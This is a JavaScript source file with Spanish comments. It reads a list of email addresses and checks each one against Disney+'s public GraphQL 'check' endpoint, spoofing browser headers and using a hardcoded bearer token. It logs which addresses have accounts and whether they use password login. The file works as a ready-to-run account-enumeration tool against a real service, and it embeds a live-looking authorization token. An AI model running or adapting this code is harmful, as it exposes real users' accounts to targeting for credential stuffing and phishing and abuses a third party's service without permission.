import fs from "fs";

// Leer emails desde archivo txt
function leerEmailsDesdeArchivo(ruta) {
    try {
        const contenido = fs.readFileSync(ruta, "utf8");
        // Filtrar líneas vacías y espacios
        return contenido.split("\n").map(line => line.trim()).filter(line => line.length > 0);
    } catch (error) {
        console.error("❌ Error leyendo archivo de emails:", error.message);
        return [];
    }
}

// Cargar emails desde el archivo
const emailsALeer = leerEmailsDesdeArchivo("./emails2.txt");

if (emailsALeer.length === 0) {
    console.log("No se encontraron emails para procesar. Asegúrate de crear el archivo 'emails.txt' con un email por línea.");
    process.exit(1);
}

console.log(`Se encontraron ${emailsALeer.length} emails para procesar.\n`);

var TOKEN = "Bearer eyJ6aXAiOiJERUYiLCJraWQiOiJ0Vy10M2ZQUTJEN2Q0YlBWTU1rSkd4dkJlZ0ZXQkdXek5KcFFtOGRJMWYwIiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..P85Ph2cSLSyEbW3v.J9n0CN48Se2PNrTatioei5cQU23TVcAtrNnZ62WK6T9BGQ1Y_3K792bu4NufJJav6ge9hX93wS--1M4BeoTCh6U57aKIcDr-k54h4t2iOdImdF0ews8IjFGSnF0s9H1s7rxq88c0dlBAn3ExaFHQGjzLhXEI5iAbnURS91yIizF8IiONK8TMkhacJkmJNtmm4HOL1LdY871L_17SrkKbtKGNYuJJ_OG6I_DjO6wf34oAoaOwX174bakNP3D_efO8Bk9QLJhJWcysNKG06dQFzNPyG-z-TQh2okfygoHiBKgxMvpmWgBbV8QhNYwBzvo8dlW5xzNlG5dzDNfZDYon2O60TPtbWQlAcEPemuHKVNI8fjbGuSjj12yKRpQGg8hAzODJGpy3xw6vu09TH5Ieec1A5D_Yd3BY9aVt9_FDcPwC1AlaaS4HlDDJLCtnaaY7aGaXGnEEOMSgbP2xWbN8BJ5qUzdDaVGSTwVwN_L8_58hCfc2zdrK4hkzaZq07Vmog1o6VGo7eG6cJHnBbcYWcvLC2efl50JR1Q0rY31z0H_XUWBveZ4ewNQPLUQxWZNl4xmxAt7xQkQgTsIkXEh8qUBYNfavkW_Z4kdURqrgGUXRemeXmHU876UtvhM3JEzlUzB-KoZ2N9n2mVD5MuVKseMOXUtL23_GABSL_kyUSNYUGahx3vJ1FT7RC1eVdR05iRYhUmiNNiHvDt3mkC3KCFKqp3r67S0-n2InHs4aQ4ckEXyxgr44vEtEo1BQUBSuxAjJ0zYzAuhNAnYDV2Zabbs3_dQeT7hyjusmkLqieyYm5SlimN9ktHCvBWY3zFqkIJJMv6tT9aG7qeEMPkkG0rWV-8AJ_sB7AvdJZjKYw_Zx7mpBeklS8sWKH_N7DajHmuh3a13_C9-JssI_wb2eWPHCLEfrKJE1unQ6sg0GFhx3ls5Jaw0gAQeAp0DWP4I-J3HyNYGwJkwa425mmKtoqABA2rkf7nLQUF2gg29KABX3_NwwpR21PZNH0sIObhOZLqAkt7MevZ4zLM12OWF7sw3Kk6-EL3CmPrtdd6xKHxxemYAjnjQBlZ7KUIigWzwe4HgY4mz0UuV7QlS5wqkxG3Pov5T2me3vDlfkUKZkXIHRRKaYIVkRjHXq5XrIVteVxfJTKXPSuoxnrcdGK0MVEC-VWUPWqgm4jnGDPLhUmabhwj0w3xo4q4me3L1fCvj3f4u4NID5iawdFb54Y73gQmrtmcK5Jjkjza7ZYzoFti_RST3CzQ_4hnlXZBMFE_D5e717d_Oj1NK7rsYbVXViDOB8DEp-znJxyh1gFP-nr1U-jkxcNyyCQCkgV4W-72CflROxZ_C39kXgGF3fqypZTuF8dg50tVagvzdzT4Fyixd40WGzsJLJy-JXolhezrQypq2hO4l1XvxzHXPc1dAfb8mwoC8ibvimuveBo5P-ml8GLH21YqkPIQaCjyYMUCSYjnNbo4Y1eRheRcHr_gCzKwKbnZkpnDNHzh6uIsu6Sqx3m0ZFiiYfWgWmGhqLL_eRsxxGnwk5f-gyThsYOEyb15wMbTPjy9EUav6wqL92xjQhvvrxZXhqL1HlqL-7xSo5wzv5iDtgFXqmkVpJAio0j_8OCjtbDRWBhg79zCskQLMGuZUQ9tZ-ePbjKWSSGK5599ARyadTIsX47m-xGCPV4yKD0gBcSbe0JFnk8RayS0LE3ziMq-3Mt_n5Bi8wQYN7IqaCeVPGYwS_cAMKxJTlxvMSBdMJcsq4XyzkvEwpV3mVg48PeFuuQTCooMG9HyCsJi5OkFcqu6Ruzh2stoPcMUFg8ZXl6m6PL1y_lfU_sXCFT8PU-B5KQX1InuZ_8wK8aE29f14EYunP_lwGCsTiW6bdO7szI_ykh9Oj8C_4NVz776KmGWIrEJiDN_rBeHCTOdXGq6g3xM3O2cdKV7UMyg8uKfyxQx3rgrV0BG-huGP5gq2Kwl9weK6JbI60X7PjU8dlI9JFEFAhr_O0LAopViTQsNG2m9AtNFCjMFmGvBWC2UH4WYK2ocYi8kodZlLLATlrJn6QW8PfAVvwjEJ6g2glOWznLLlmjMVQNRS4fLC311n0aMM8ObWOOJecDkGMSORX8x3obtd3WMTVQmRkZqQ54MORFNDj5HtKOaScmo8P5HUIeIUl9DnKUk0y_LkI1Z2ji7UjntWczUaG4l-YxXsG2_j25sIuoa7NaHb0YosLikn70gjSJ0a9vpAS5IPDRiQjjY-DS_jG-tyv4q9v_FBRjBTqsYqIjKDqmNUPMgxGtUU1Fh7_8P_3w-tTTLVd3HFkXB63QosbVXGN3g96do2w8T5w1jHWBhcBnvBaiCSxSC-hK2ZEOgp4ugrqyM8Y8dgrT5UQdq7OS196ElFgbAjZCEvtTFkUAMuQwzi9lU7fEJIe9Fp12nWBLvL4Udl0YouHeaaWvZpLKfypjMGyfFM1WjXkEjDBrGRAt4o2uFHjS9T6kdFmIEeBSHzv7ELdYt0z0yAxJzk0WkQ8Jo8ZcomDXzX7f992JZ6etxXAaDMGyO1bcBT_h_1xmXfCMnz7jxY_waNrL04jOoCyu-p4d6bKfcC4MErL6yjgdXUJbmelDmvg2KB33g.WkhVy_5biz2sJ_bIlF2U1A"

const rutaArchivo = "./resultados.json";
fs.writeFileSync(rutaArchivo, "[]", "utf8");

function cargarJSON() {
    try {
        const data = fs.readFileSync(rutaArchivo, "utf8");
        return JSON.parse(data);
    } catch {
        return [];
    }
}

function guardarResultado(email, result) {
    const datos = cargarJSON();
    datos.push({
        email,
        exist: result.exist,
        noError: result.noError,
        errorMessage: result.errorMessage || null
    });
    fs.writeFileSync(rutaArchivo, JSON.stringify(datos, null, 2), "utf8");
}

// Procesar cada email del archivo
for (let i = 0; i < emailsALeer.length; i++) {
    const correoFormado = emailsALeer[i];

    if (!correoFormado.includes('@')) {
        console.log(`⚠️ Línea ${i + 1} no es un email válido: ${correoFormado}`);
        continue;
    }

    var result = await checkDisneyExists(correoFormado);
    guardarResultado(correoFormado, result);

    if (result.noError) {
        if (result.exist === true) {
            console.log(correoFormado + " PERRO existeeeeeeeeeeeeeeeeeeee")
        }
        if (result.exist === false) {
            console.log((i + 1) + " no existe")
        }
    }

    if (result.noError === false) {
        if (result.serverError) {
            console.error("🖥🖥🖥🖥 Error servidor: " + result.errorMessage)
        } else {
            console.log("🌐🌐🌐🌐 Error solicitud: " + result.errorMessage);
        }
    }
}

async function checkDisneyExists(email) {
    var result = {
        noError: false,
        exist: null,
        serverError: false,
        errorMessage: ""
    }
    try {
        var serverResponse = await fetch("https://disney.api.edge.bamgrid.com/v1/public/graphql ", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Google Chrome\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "javascript/windows/chrome",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "34.1",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "x-request-id": "07f43d86-8b1e-4276-a724-4ca71801239d",
                "x-request-yp-id": "624b805dafc5c73635b1a216",
                "Referer": "https://www.disneyplus.com/ ",
                "authorization": TOKEN,
            },
            "body": "{\"query\":\"\\n    query check($email: String!) {\\n        check(email: $email) {\\n            operations\\n            nextOperation\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + email + "\"},\"operationName\":\"check\"}",
            "method": "POST"
        })

        var jsonResponse = await serverResponse.json();
        if (jsonResponse.hasOwnProperty("errors")) {
            result.serverError = true;
            throw new Error(jsonResponse.errors[0].code);
        }

        if (jsonResponse.hasOwnProperty("data")) {
            if (jsonResponse.data.hasOwnProperty("check")) {
                if (jsonResponse.data.check.hasOwnProperty("operations")) {
                    if (jsonResponse.data.check.operations.includes("Login") || jsonResponse.data.check.operations.includes("OTP")) {
                        result.exist = true;
                        result.noError = true;
                        if (jsonResponse.data.check.operations.includes("Login")){
                            result.login=true
                            console.log("LOGIN")
                        }else{
                            result.login=false
                        }
                    }
                    if (jsonResponse.data.check.operations.includes("Register")) {
                        result.exist = false;
                        result.noError = true;
                    }
                }
            }
        }
        if (result.exist === null) {
            throw new Error("No se pudo determinar si existe")
        }

    } catch (error) {
        result.errorMessage = error.message;
        result.noError = false;
    } finally {
        return result
    }
}